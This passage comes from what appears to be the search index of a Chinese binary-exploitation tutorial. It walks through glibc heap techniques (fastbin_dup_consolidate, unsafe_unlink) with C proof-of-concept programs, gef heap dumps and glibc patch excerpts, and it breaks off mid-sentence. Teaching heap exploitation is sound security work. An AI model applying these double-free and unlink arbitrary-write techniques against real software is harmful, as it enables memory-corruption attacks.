0x0000000000000000 0x0000000000000021 <-- fake chunk 0x7fffffffdc40: 0x4747474747474747 0x0000000000602000 0x7fffffffdc50: 0x0000000000602030 \u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free \u8986\u76d6 fastbins \u7684\u7ed3\u6784\uff0c\u6765\u83b7\u5f97\u4e00\u4e2a\u6307\u5411\u4efb\u610f\u5730\u5740\u7684\u6307\u9488\u3002","title":"fastbin_dup_into_stack"},{"location":"Tutorial/Material/Binary%20Exploitation/#fastbin_dup_consolidate","text":"#include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> int main() { void *p1 = malloc(0x10); void *p2 = malloc(0x10); strcpy(p1, \"AAAAAAAA\"); strcpy(p2, \"BBBBBBBB\"); fprintf(stderr, \"Allocated two fastbins: p1=%p p2=%p\\n\", p1, p2); fprintf(stderr, \"Now free p1!\\n\"); free(p1); void *p3 = malloc(0x400); fprintf(stderr, \"Allocated large bin to trigger malloc_consolidate(): p3=%p\\n\", p3); fprintf(stderr, \"In malloc_consolidate(), p1 is moved to the unsorted bin.\\n\"); free(p1); fprintf(stderr, \"Trigger the double free vulnerability!\\n\"); fprintf(stderr, \"We can pass the check in malloc() since p1 is not fast top.\\n\"); void *p4 = malloc(0x10); strcpy(p4, \"CCCCCCC\"); void *p5 = malloc(0x10); strcpy(p5, \"DDDDDDDD\"); fprintf(stderr, \"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\\n\", p4, p5); } $ gcc -g fastbin_dup_consolidate.c $ ./a.out Allocated two fastbins: p1=0x17c4010 p2=0x17c4030 Now free p1! Allocated large bin to trigger malloc_consolidate(): p3=0x17c4050 In malloc_consolidate(), p1 is moved to the unsorted bin. Trigger the double free vulnerability! We can pass the check in malloc() since p1 is not fast top. Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010 \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528\u5728 large bin \u7684\u5206\u914d\u4e2d malloc_consolidate \u673a\u5236\u7ed5\u8fc7 fastbin \u5bf9 double free \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u5728 fastbin_dup \u4e2d\u5df2\u7ecf\u5c55\u793a\u8fc7\u4e86\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5229\u7528\u7684\u662f\u5728\u4e24\u6b21 free \u4e2d\u95f4\u63d2\u5165\u4e00\u6b21\u5bf9\u5176\u5b83 chunk \u7684 free\u3002 \u9996\u5148\u5206\u914d\u4e24\u4e2a fast chunk\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <-- top chunk 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 \u91ca\u653e\u6389 p1\uff0c\u5219\u7a7a\u95f2 chunk \u52a0\u5165\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <-- top chunk 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u6b21\u91ca\u653e p1\uff0c\u5fc5\u7136\u89e6\u53d1 double free \u5f02\u5e38\uff0c\u7136\u800c\uff0c\u5982\u679c\u6b64\u65f6\u5206\u914d\u4e00\u4e2a large chunk\uff0c\u6548\u679c\u5982\u4e0b\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed] 0x602010: 0x00007ffff7dd1b88 0x00007ffff7dd1b88 <-- fd, bk pointer 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] 0x00 gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. \u53ef\u4ee5\u770b\u5230 fastbins \u4e2d\u7684 chunk \u5df2\u7ecf\u4e0d\u89c1\u4e86\uff0c\u53cd\u800c\u51fa\u73b0\u5728\u4e86 small bins \u4e2d\uff0c\u5e76\u4e14 chunk p2 \u7684 prev_size \u548c size \u5b57\u6bb5\u90fd\u88ab\u4fee\u6539\u3002 \u770b\u4e00\u4e0b large chunk \u7684\u5206\u914d\u8fc7\u7a0b\uff1a /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); } \u5f53\u5206\u914d large chunk \u65f6\uff0c\u9996\u5148\u6839\u636e chunk \u7684\u5927\u5c0f\u83b7\u5f97\u5bf9\u5e94\u7684 large bin \u7684 index\uff0c\u63a5\u7740\u5224\u65ad\u5f53\u524d\u5206\u914d\u533a\u7684 fast bins \u4e2d\u662f\u5426\u5305\u542b chunk\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528 malloc_consolidate() \u51fd\u6570\u5408\u5e76 fast bins \u4e2d\u7684 chunk\uff0c\u5e76\u5c06\u8fd9\u4e9b\u7a7a\u95f2 chunk \u52a0\u5165 unsorted bin \u4e2d\u3002\u56e0\u4e3a\u8fd9\u91cc\u5206\u914d\u7684\u662f\u4e00\u4e2a large chunk\uff0c\u6240\u4ee5 unsorted bin \u4e2d\u7684 chunk \u6309\u7167\u5927\u5c0f\u88ab\u653e\u56de small bins \u6216 large bins \u4e2d\u3002 \u7531\u4e8e\u6b64\u65f6 p1 \u5df2\u7ecf\u4e0d\u5728 fastbins \u7684\u9876\u90e8\uff0c\u53ef\u4ee5\u518d\u6b21\u91ca\u653e p1\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [double freed] 0x602010: 0x0000000000000000 0x00007ffff7dd1b88 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. p1 \u88ab\u518d\u6b21\u653e\u5165 fastbins\uff0c\u4e8e\u662f p1 \u540c\u65f6\u5b58\u5728\u4e8e fabins \u548c small bins \u4e2d\u3002 \u7b2c\u4e00\u6b21 malloc\uff0cchunk \u5c06\u4ece fastbins \u4e2d\u53d6\u51fa\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed], chunk p4 0x602010: 0x0043434343434343 0x00007ffff7dd1b88 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] 0x00 gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. \u7b2c\u4e8c\u6b21 malloc\uff0cchunk \u4ece small bins \u4e2d\u53d6\u51fa\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p4, chunk p5 0x602010: 0x4444444444444444 0x00007ffff7dd1b00 0x602020: 0x0000000000000020 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 chunk p4 \u548c p5 \u5728\u540c\u4e00\u4f4d\u7f6e\u3002","title":"fastbin_dup_consolidate"},{"location":"Tutorial/Material/Binary%20Exploitation/#unsafe_unlink","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> uint64_t *chunk0_ptr; int main() { int malloc_size = 0x80; // not fastbins int header_size = 2; chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr); fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); // pass this check: (P->fd->bk != P || P->bk->fd != P) == False chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, \"Fake chunk fd: %p\\n\", (void*) chunk0_ptr[2]); fprintf(stderr, \"Fake chunk bk: %p\\n\\n\", (void*) chunk0_ptr[3]); // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False // chunk0_ptr[1] = 0x0; // or 0x8, 0x80 uint64_t *chunk1_hdr = chunk1_ptr - header_size; chunk1_hdr[0] = malloc_size; chunk1_hdr[1] &= ~1; // deal with tcache // int *a[10]; // int i; // for (i = 0; i < 7; i++) { // a[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(a[i]); // } free(chunk1_ptr); char victim_string[9]; strcpy(victim_string, \"AAAAAAAA\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, \"Original value: %s\\n\", victim_string); chunk0_ptr[0] = 0x4242424242424242LL; fprintf(stderr, \"New Value: %s\\n\", victim_string); } $ gcc -g unsafe_unlink.c $ ./a.out The global chunk0_ptr is at 0x601070, pointing to 0x721010 The victim chunk we are going to corrupt is at 0x7210a0 Fake chunk fd: 0x601058 Fake chunk bk: 0x601060 Original value: AAAAAAAA New Value: BBBBBBBB \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u5229\u7528 free \u6539\u5199\u5168\u5c40\u6307\u9488 chunk0_ptr \u8fbe\u5230\u4efb\u610f\u5185\u5b58\u5199\u7684\u76ee\u7684\uff0c\u5373 unsafe unlink\u3002\u8be5\u6280\u672f\u6700\u5e38\u89c1\u7684\u5229\u7528\u573a\u666f\u662f\u6211\u4eec\u6709\u4e00\u4e2a\u53ef\u4ee5\u6ea2\u51fa\u6f0f\u6d1e\u548c\u4e00\u4e2a\u5168\u5c40\u6307\u9488\u3002 Ubuntu16.04 \u4f7f\u7528 libc-2.23\uff0c\u5176\u4e2d unlink \u5b9e\u73b0\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u5bf9\u524d\u540e\u5806\u5757\u7684\u68c0\u67e5\uff0c\u4e5f\u662f\u6211\u4eec\u9700\u8981\u7ed5\u8fc7\u7684\uff1a /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) { \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ if (!in_smallbin_range (P->size) \\ && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ if (FD->fd_nextsize == NULL) { \\ if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } \u5728\u89e3\u94fe\u64cd\u4f5c\u4e4b\u524d\uff0c\u9488\u5bf9\u5806\u5757 P \u81ea\u8eab\u7684 fd \u548c bk \u68c0\u67e5\u4e86\u94fe\u8868\u7684\u5b8c\u6574\u6027\uff0c\u5373\u5224\u65ad\u5806\u5757 P \u7684\u524d\u4e00\u5757 fd \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\uff0c\u4ee5\u53ca\u540e\u4e00\u5757 bk \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\u3002 malloc_size \u8bbe\u7f6e\u4e3a 0x80\uff0c\u53ef\u4ee5\u5206\u914d small chunk\uff0c\u7136\u540e\u5b9a\u4e49 header_size \u4e3a 2\u3002\u7533\u8bf7\u4e24\u5757\u7a7a\u95f4\uff0c\u5168\u5c40\u6307\u9488 chunk0_ptr \u6307\u5411 chunk0\uff0c\u5c40\u90e8\u6307\u9488 chunk1_ptr \u6307\u5411 chunk1\uff1a gef\u27a4 p &chunk0_ptr $1 = (uint64_t **) 0x601070 <chunk0_ptr> gef\u27a4 x/gx &chunk0_ptr 0x601070 <chunk0_ptr>: 0x0000000000602010 gef\u27a4 p &chunk1_ptr $2 = (uint64_t **) 0x7fffffffdc60 gef\u27a4 x/gx &chunk1_ptr 0x7fffffffdc60: 0x00000000006020a0 gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u8981\u7ed5\u8fc7 (P->fd->bk != P || P->bk->fd != P) == False \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u6709\u4e2a\u7f3a\u9677\uff0c\u5c31\u662f fd/bk \u6307\u9488\u90fd\u662f\u901a\u8fc7\u4e0e chunk \u5934\u90e8\u7684\u76f8\u5bf9\u5730\u5740\u6765\u67e5\u627e\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5168\u5c40\u6307\u9488 chunk0_ptr \u6784\u9020 fake chunk \u6765\u7ed5\u8fc7\u5b83\uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 <-- prev_size 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 <-- fake chunk FD 0x601068: 0x0000000000000000 0x0000000000602010 <-- bk pointer 0x601078: 0x0000000000000000 gef\u27a4 x/5gx 0x601060 0x601060: 0x00007ffff7dd2540 0x0000000000000000 <-- fake chunk BK 0x601070: 0x0000000000602010 0x0000000000000000 <-- fd pointer 0x601080: 0x0000000000000000 \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5728 chunk0 \u91cc\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u7528 P \u8868\u793a\uff0c\u4e24\u4e2a\u6307\u9488 fd \u548c bk \u53ef\u4ee5\u6784\u6210\u4e24\u6761\u94fe\uff1a P->fd->bk == P \uff0c P->bk->fd == P \uff0c\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916\u5229\u7528 chunk0 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4fee\u6539 chunk 1 \u7684 prev_size \u4e3a fake chunk \u7684\u5927\u5c0f\uff0c\u4fee\u6539 PREV_INUSE \u6807\u5fd7\u4f4d\u4e3a 0\uff0c\u5c06 fake chunk \u4f2a\u9020\u6210\u4e00\u4e2a free chunk\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u91ca\u653e\u6389 chunk1\uff0c\u8fd9\u4f1a\u89e6\u53d1 fake chunk \u7684 unlink \u5e76\u8986\u76d6 chunk0_ptr \u7684\u503c\u3002unlink \u64cd\u4f5c\u662f\u8fd9\u6837\u8fdb\u884c\u7684\uff1a FD = P->fd; BK = P->bk; FD->bk = BK BK->fd = FD \u6839\u636e fd \u548c bk \u6307\u9488\u5728 malloc_chunk \u7ed3\u6784\u4f53\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7b49\u4ef7\u4e8e\uff1a FD = P->fd = &P - 24 BK = P->bk = &P - 16 FD->bk = *(&P - 24 + 24) = P FD->fd = *(&P - 16 + 16) = P \u8fd9\u6837\u5c31\u901a\u8fc7\u4e86 unlink \u7684\u68c0\u67e5\uff0c\u6700\u7ec8\u6548\u679c\u4e3a\uff1a FD->bk = P = BK = &P - 16 BK->fd = P = FD = &P - 24 \u539f\u672c\u6307\u5411\u5806\u4e0a fake chunk \u7684\u6307\u9488 P \u6307\u5411\u4e86\u81ea\u8eab\u5730\u5740\u51cf 24 \u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5982\u679c\u7a0b\u5e8f\u529f\u80fd\u5141\u8bb8\u5806 P \u8fdb\u884c\u5199\u5165\uff0c\u5c31\u80fd\u6539\u5199 P \u6307\u9488\u81ea\u8eab\u7684\u5730\u5740\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u5185\u5b58\u5199\u5165\u3002\u82e5\u5141\u8bb8\u5806 P \u8fdb\u884c\u8bfb\u53d6\uff0c\u5219\u4f1a\u9020\u6210\u4fe1\u606f\u6cc4\u6f0f\u3002 \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8e P->fd->bk \u548c P->bk->fd \u90fd\u6307\u5411 P\uff0c\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\u4e3a\uff1a chunk0_ptr = P = P->fd \u6210\u529f\u5730\u4fee\u6539\u4e86 chunk0_ptr\uff0c\u8fd9\u65f6 chunk0_ptr \u548c chunk0_ptr[3] \u5b9e\u9645\u4e0a\u5c31\u662f\u540c\u4e00\u4e1c\u897f\u3002\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u7591\u60d1\u4e3a\u4ec0\u4e48\u8fd9\u4e24\u4e2a\u4e1c\u897f\u662f\u4e00\u6837\u7684\uff0c\u56e0\u4e3a chunk0_ptr \u6307\u9488\u5728\u662f\u653e\u5728\u6570\u636e\u6bb5\u4e0a\u7684\uff0c\u5730\u5740\u5728 0x601070 \uff0c\u6307\u5411 0x601058 \uff0c\u800c chunk0_ptr[3] \u7684\u610f\u601d\u662f\u4ece chunk0_ptr \u6307\u5411\u7684\u5730\u65b9\u5f00\u59cb\u6570 3 \u4e2a\u5355\u4f4d\uff0c\u6240\u4ee5 0x601058+0x08*3=0x601070 \uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000020ff1 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 [be freed] 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 <-- fake chunk FD 0x601068: 0x0000000000000000 0x0000000000601058 <-- bk pointer 0x601078: 0x0000000000000000 gef\u27a4 x/5gx 0x601060 0x601060: 0x00007ffff7dd2540 0x0000000000000000 <-- fake chunk BK 0x601070: 0x0000000000601058 0x0000000000000000 <-- fd pointer 0x601080: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr 0x601058: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr[3] 0x601058: 0x0000000000000000 \u6240\u4ee5\uff0c\u4fee\u6539 chunk0_ptr[3] \u5c31\u7b49\u4e8e\u4fee\u6539 chunk0_ptr \uff1a gef\u27a4 x/5gx 0x601058 0x601058: 0x0000000000000000 0x00007ffff7dd2540 0x601068: 0x0000000000000000 0x00007fffffffdc70 <-- chunk0_ptr[3] 0x601078: 0x0000000000000000 gef\u27a4 x/gx chunk0_ptr 0x7fffffffdc70: 0x4141414141414141 \u8fd9\u65f6 chunk0_ptr \u5c31\u6307\u5411\u4e86 victim_string\uff0c\u4fee\u6539\u5b83\uff1a gef\u27a4 x/gx chunk0_ptr 0x7fffffffdc70: 0x4242424242424242 \u6210\u529f\u8fbe\u6210\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u6210\u5c31\u3002 \u6700\u540e\u770b\u4e00\u70b9\u65b0\u7684\u4e1c\u897f\uff0clibc-2.25 \u5728 unlink \u7684\u5f00\u5934\u589e\u52a0\u4e86\u5bf9 chunk_size == next->prev->chunk_size \u7684\u68c0\u67e5\uff0c\u4ee5\u5bf9\u6297\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u95ee\u9898\u3002\u8865\u4e01\u5982\u4e0b\uff1a $ git show 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 malloc/malloc.c commit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 Author: DJ Delorie <dj@delorie.com> Date: Fri Mar 17 15:31:38 2017 -0400 Further harden glibc malloc metadata against 1-byte overflows. Additional check for chunk_size == next->prev->chunk_size in unlink() 2017-03-17 Chris Evans <scarybeasts@gmail.com> * malloc/malloc.c (unlink): Add consistency check between size and next->prev->size, to further harden against 1-byte overflows. diff --git a/malloc/malloc.c b/malloc/malloc.c index e29105c372..994a23248e 100644 --- a/malloc/malloc.c +++ b/malloc/malloc.c @@ -1376,6 +1376,8 @@ typedef struct malloc_chunk *mbinptr; /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) { \\ + if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ + malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV); \\ FD = P->fd; \\ BK = P->bk; \\ if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ \u5177\u4f53\u662f\u8fd9\u6837\u7684\uff1a /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p))) /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Bits to mask off when extracting size */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u56de\u987e\u4e00\u4e0b\u4f2a\u9020\u51fa\u6765\u7684\u5806\uff1a gef\u27a4 x/40gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 0 0x602010: 0x0000000000000000 0x0000000000000000 <-- fake chunk P 0x602020: 0x0000000000601058 0x0000000000601060 <-- fd, bk pointer 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000080 0x0000000000000090 <-- chunk 1 <-- prev_size 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000000000 0x6020e0: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x0000000000000000 0x602100: 0x0000000000000000 0x0000000000000000 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000020ee1 <-- top chunk 0x602130: 0x0000000000000000 0x0000000000000000 \u8fd9\u91cc\u6709\u4e09\u79cd\u529e\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8be5\u68c0\u67e5\uff1a \u4ec0\u4e48\u90fd\u4e0d\u505a\u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x0 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0 \u8bbe\u7f6e chunk0_ptr[1] = 0x8 \u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x8 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8 \u8bbe\u7f6e chunk0_ptr[1] = 0x80 \u3002 chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x80 prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80 \u597d\u7684\uff0c\u73b0\u5728 libc-2.25 \u7248\u672c\u4e0b\u6211\u4eec\u4e5f\u80fd\u6210\u529f\u5229\u7528\u4e86\u3002\u63a5\u4e0b\u6765\u66f4\u8fd1\u4e00\u6b65\uff0clibc-2.26 \u600e\u4e48\u5229\u7528\uff0c\u9996\u5148\u5f53\u7136\u8981\u5148\u77e5\u9053\u5b83\u65b0\u589e\u4e86\u54ea\u4e9b\u6f0f\u6d1e\u7f13\u89e3\u63aa\u65bd\uff0c\u5176\u4e2d\u4e00\u4e2a\u795e\u5947\u7684\u4e1c\u897f\u53eb\u505a 